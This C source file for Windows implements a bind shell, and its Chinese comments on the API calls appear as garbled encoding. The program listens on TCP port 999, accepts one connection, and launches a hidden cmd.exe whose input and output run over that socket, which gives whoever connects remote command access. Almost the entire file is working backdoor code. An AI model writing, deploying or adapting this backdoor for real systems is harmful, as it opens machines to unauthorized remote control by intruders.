#pragma comment(lib,"ws2_32.lib")
//#include <windows.h>
#include<WinSock2.h>
#define MasterPort 999
int main()
{
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    /*
    typedef struct _STARTUPINFO 
{ 
     DWORD cb;             //����STARTUPINFO�ṹ�е��ֽ���.���Microsoft������չ�ýṹ,���������汾�����ֶ�.Ӧ�ó�����뽫cb��ʼ��Ϊsizeof ( STARTUPINFO ) 
     PSTR lpReserved;       //�����������ʼ��ΪN U L L 
     PSTR lpDesktop;     //���ڱ�ʶ����Ӧ�ó������ڵ���������֡������������ڣ��½��̱���ָ���������������������治���ڣ��㴴��һ������Ĭ�����Ե����棬��ʹ��Ϊ�½���ָ�������֡�    ���lpDesktop��NULL�������������� ),��ô�ý��̽��뵱ǰ��������� 
     PSTR lpTitle;     //�����趨����̨���ڵ����ơ����l p Ti t l e ��N U L L �����ִ���ļ������ֽ����������� 
     DWORD dwX;       //�����趨Ӧ�ó��򴰿�����Ļ��Ӧ�÷��õ�λ�õ�x ��y ���꣨������Ϊ��λ���� 
     DWORD dwY;       //ֻ�е��ӽ�����CW_USEDEFAULT��ΪCreateWindow��x�������������ĵ�һ���ص�����ʱ,    ��ʹ�����������ꡣ���Ǵ�������̨���ڵ�Ӧ�ó�����Щ��Ա����ָ������̨���ڵ����Ͻ� 

     DWORD dwXSize;   //�����趨Ӧ�ó��򴰿ڵĿ�Ⱥͳ��ȣ�������Ϊ��λ��ֻ��dwYsize 
     DWORD dwYSize;   // ���ӽ��̽�CW_USEDEFAULT ����CreateWindow ��nWidth�������������ĵ�һ���ص�����ʱ����ʹ����Щֵ�����Ǵ�������̨���ڵ�Ӧ�ó�����Щ��Ա������ָ������̨���ڵĿ�� 
     DWORD dwXCountChars;   //�����趨��Ӧ�ó���Ŀ���̨���ڵĿ�Ⱥ͸߶ȣ����ַ�Ϊ��λ�� 
     DWORD dwYCountChars; 
     DWORD dwFillAttribute;   //�����趨��Ӧ�ó���Ŀ���̨����ʹ�õ��ı��ͱ�����ɫ 
     DWORD dwFlags;           //��μ���һ��
                                    STARTF_USESIZE                  // ʹ��dwXSize ��dwYSize ��Ա 
                                    STARTF_USESHOWWINDOW            //ʹ��wShowWindow ��Ա 
                                    STARTF_USEPOSITION              //ʹ��dwX ��dwY ��Ա 
                                    STARTF_USECOUNTCHARS            //ʹ��dwXCountChars ��dwYCount Chars ��Ա 
                                    STARTF_USEFILLATTRIBUTE         //ʹ��dwFillAttribute ��Ա 
                                    STARTF_USESTDHANDLES            //ʹ��hStdInput ��hStdOutput ��hStdError ��Ա 
                                    STARTF_RUN_FULLSCREEN           //ǿ����x86 ����������еĿ���̨Ӧ�ó�����ȫ��Ļ��ʽ��������
     WORD wShowWindow;         //�����趨�����Ӧ�ó�����ε��õ�ShowWindow ��SW_SHOWDEFAULT ��Ϊ    nCmdShow ��������ʱ����Ӧ�ó���ĵ�һ���ص�����Ӧ����γ��֡�����Ա������ͨ������ShowWindow �������κ�һ��SW_*��ʶ�� 
     WORD cbReserved2;         //���������뱻��ʼ��Ϊ0 
     PBYTE lpReserved2;       //���������뱻��ʼ��ΪN U L L 
     HANDLE hStdInput;         //�����趨������̨���������õĻ���ľ��������Ĭ�����ã�hStdInput ���ڱ�ʶ���̻��棬hStdOutput ��hStdError���ڱ�ʶ����̨���ڵĻ��� 
     HANDLE hStdOutput; 
     HANDLE hStdError; 
} STARTUPINFO, *LPSTARTUPINFO;*/
    wchar_t szCMDPath[MAX_PATH];
    //�����ڴ���Դ����ʼ������
    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
    ZeroMemory(&WSADa, sizeof(WSADa));
    //��ȡCMD·��
    GetEnvironmentVariable(L"COMSPEC", szCMDPath, sizeof(szCMDPath));
    //����ws2_32.dll
    WSAStartup(0x0202, &WSADa);
    //���ñ�����Ϣ�Ͱ�Э�飬����Socket
    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
/*
    SOCKET WSASocket (
����int af, 
����int type, 
����int protocol, 
����LPWSAPROTOCOL_INFO lpProtocolInfo, 
����GROUP g, 
����DWORD dwFlags 
����);
����˵����
af��[in]һ����ַ��淶����֧��AF_INET��ʽ���༴ARPA Internet��ַ��ʽ��
type�����׽ӿڵ�����������
protocol���׽ӿ�ʹ�õ��ض�Э�飬��������߲�Ըָ��Э����Ϊ0��
lpProtocolInfo��һ��ָ��PROTOCOL_INFO�ṹ��ָ�룬�ýṹ�����������׽ӿڵ����ԡ�������������㣬��ǰ����������af, type, protocol�������ԡ�
g��������δ��ʹ�õ��׽����顣�׽ӿ���ı�ʶ����
iFlags���׽ӿ�����������
*/
    //���ð󶨶˿�999:
    bind(CSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));
    //���÷������˼����˿�:
    listen(CSocket, 1);
    iAddrSize = sizeof(SockAddrIn);
    //��ʼ����Զ�̷����������������ش��ڽṹ�壺
    SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.wShowWindow = SW_HIDE;                                  //������ʾ���Ը�Ϊ����
    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.hStdInput = (HANDLE)SSocket;
    StartupInfo.hStdOutput = (HANDLE)SSocket;
    StartupInfo.hStdError = (HANDLE)SSocket;
    //��������ͨ����
    CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
    /*
����ԭ�ͣ�
BOOL CreateProcess
(
    LPCTSTR lpApplicationName,        
    LPTSTR lpCommandLine,        
    LPSECURITY_ATTRIBUTES lpProcessAttributes��
    LPSECURITY_ATTRIBUTES lpThreadAttributes,        
    BOOL bInheritHandles,        
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,        
    LPCTSTR lpCurrentDirectory,        
    LPSTARTUPINFO lpStartupInfo,        
    LPPROCESS_INFORMATION lpProcessInformation 
)
LPCTSTR lpApplicationName:
ָ��һ��NULL��β�ġ�����ָ����ִ��ģ����ַ�����
����ַ��������ǿ�ִ��ģ��ľ���·����Ҳ���������·�����ں�һ������£�����ʹ�õ�ǰ��������Ŀ¼������ִ��ģ���·����
����������Ա���ΪNULL������������£���ִ��ģ������ֱ��봦�� lpCommandLine ������ǰ�沢�ɿո���������ַ��ֿ���
һ�㶼��ΪNULL
LPTSTR lpCommandLine��
ָ��һ����NULL��β���ַ��������ַ���ָ��Ҫִ�е������С�
�����������Ϊ�գ���ô������ʹ��lpApplicationName����ָ�����ַ�������Ҫ���еĳ���������С�
���lpApplicationName��lpCommandLine��������Ϊ�գ���ôlpApplicationName����ָ����Ҫ�����е�ģ�飬lpCommandLine����ָ���������е�ģ��������С�
�����еĽ��̿���ʹ��GetCommandLine����������������С�C���Գ������ʹ��argc��argv������
LPSECURITY_ATTRIBUTES lpProcessAttributes��
ָ��һ��SECURITY_ATTRIBUTES�ṹ�壬����ṹ������Ƿ񷵻صľ�����Ա��ӽ��̼̳С����lpProcessAttributes����Ϊ�գ�NULL������ô������ܱ��̳С�
��Windows NT�У�SECURITY_ATTRIBUTES�ṹ��lpSecurityDescriptor��Աָ�����½��̵İ�ȫ���������������Ϊ�գ��½���ʹ��Ĭ�ϵİ�ȫ��������
LPSECURITY_ATTRIBUTES lpThreadAttributes��
ͬlpProcessAttribute,��������������������߳��Ƿ񱻼̳�.ͨ����ΪNULL.
BOOL bInheritHandles
ָʾ�½����Ƿ�ӵ��ý��̴��̳��˾����
���������ֵΪ�棬���ý����е�ÿһ���ɼ̳еĴ򿪾���������ӽ��̼̳С����̳еľ����ԭ����ӵ����ȫ��ͬ��ֵ�ͷ���Ȩ�ޡ�
DWORD dwCreationFlags:
�����½��̵������࣬���������������˽��̵��̵߳��ȵ����ȼ���
LPVOID lpEnvironment:
ָ��һ���½��̵Ļ����顣����˲���Ϊ�գ��½���ʹ�õ��ý��̵Ļ�����
LPCTSTR lpCurrentDirectory:
ָ��һ����NULL��β���ַ���������ַ�������ָ���ӽ��̵Ĺ���·��������ַ���������һ���������������ľ���·����
����������Ϊ�գ��½��̽�ʹ������ý�����ͬ����������Ŀ¼�����ѡ����һ����Ҫ����Ӧ�ó���ָ�����ǵ��������͹���Ŀ¼����ǳ������Ҫ������
LPSTARTUPINFO lpStartupInfo:
ָ��һ�����ھ����½��̵������������ʾ��STARTUPINFO�ṹ�塣
lpProcessInformation:
ָ��һ�����������½��̵�ʶ����Ϣ��PROCESS_INFORMATION�ṹ�塣
*/
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
/*
DWORD WINAPI WaitForSingleObject(
__in HANDLE hHandle,
__in DWORD dwMilliseconds
);
hHandle:ָ������
dwMilliseconds�������������������ֵ��0��INFINITE����Ϊ0����ú����������أ���ΪINFINITE�����߳�һֱ������ֱ��hHandle��ָ��Ķ����Ϊ���ź�״̬ʱΪֹ��*/
//�رս��̾����
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    closesocket(CSocket);
    closesocket(SSocket);
    //�ر�����ж��ws2_32.dll
    WSACleanup();
    return 0;
}